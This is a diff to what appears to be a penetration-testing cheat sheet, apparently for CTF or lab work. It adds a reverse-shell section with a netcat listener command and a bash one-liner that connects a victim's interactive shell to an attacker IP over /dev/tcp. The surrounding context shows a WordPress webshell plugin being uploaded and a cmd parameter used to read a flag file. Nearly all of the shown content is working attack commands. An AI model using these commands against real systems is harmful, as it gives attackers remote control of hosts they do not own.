@@ -23,6 +23,7 @@
   * [Filter bypass](#filter-bypass)
 * [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
 * [Webshell](#Webshell)
+* [ReverseShell](#ReverseShell)
 
 # Enumeration
 
@@ -416,5 +417,18 @@ if(isset($_GET['cmd'])){
 zip wordpress-webshell.zip wordpress-webshell.php
 # upload plugin(http://target/wp-admin/plugin-install.php)
 # http://target/wp-content/plugins/wordpress-webshell/wordpress-webshell.php?cmd=cat%20/tmp/flag
+~~~
+
+
+# ReverseShell
+
+## Attacker Listener
+~~~ shell
+nc -nvlp 4444
+~~~
+
+## Victim Connection
+~~~ shell
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 ~~~
 
